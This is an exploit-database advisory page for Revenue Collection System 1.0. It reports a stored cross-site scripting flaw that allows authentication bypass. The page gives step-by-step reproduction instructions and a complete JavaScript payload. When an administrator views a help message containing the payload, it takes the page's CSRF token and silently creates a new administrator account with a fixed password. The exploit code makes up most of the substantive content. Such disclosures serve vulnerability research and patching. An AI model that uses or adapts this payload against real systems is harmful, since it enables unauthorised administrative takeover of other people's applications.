---
title: Revenue Collection System 1.0 Cross Site Scripting / Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2022110027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-18
fetch_date: 2025-10-03T23:05:03.605048
---

# Revenue Collection System 1.0 Cross Site Scripting / Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Revenue Collection System 1.0 Cross Site Scripting / Authentication Bypass** **2022.11.17**  Credit:  **[Joe Pollock](https://cxsecurity.com/author/Joe%2BPollock/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Revenue Collection System v1.0 - Authentication Bypass via Stored XSS
# Exploit Author: Joe Pollock
# Date: November 16, 2022
# Vendor Homepage: https://www.sourcecodester.com/php/14904/rates-system.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/rates.zip
# Tested on: Kali Linux, Apache, Mysql
# CVE: T.B.C
# Vendor: Kapiya
# Version: 1.0
# Exploit Description:
# Revenue Collection System v1.0 suffers from a Stored Cross-Site Scripting vulnerability allowing an authenticated
# client user to add an administrative user account to the application then log in as the newly created admin.
To reproduce this exploit, log in as a client user then navigate to the 'Help' functionality (/index.php?page=help).
The help functionality is used to contact an administrator by sending a message. Paste the Javascript code below into the
'Your Message' textbox then click 'Send'. When an administrator views this message, an administrative user account will
be added to the application with username "admin\_new" and password "Test123Test123". Using these credentials, it should
now be possible to log in to the application via the administrative login, here: /admin/login.php (Note: change the
'target', 'x\_Username', and 'x\_Passsword' as required).
<script>
var target = "http://localhost/rates/admin/usersadd.php";
var req = new XMLHttpRequest();
req.open("GET", target);
req.send();
var parser = new DOMParser();
resp = req.responseText
var document = parser.parseFromString(resp, "text/html");
var token = document.getElementsByName("token")[0].value;
var params = "token="+token+"&t=users&action=insert&&modal=0&x\_Fullname=test&x\_Username=admin\_new&x\_\_Email=test123%40test123.com&x\_Passsword=Test123Test123&x\_userLevelId=-1";
req.open("POST", target);
req.withCredentials = true;
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
</script>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110027)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top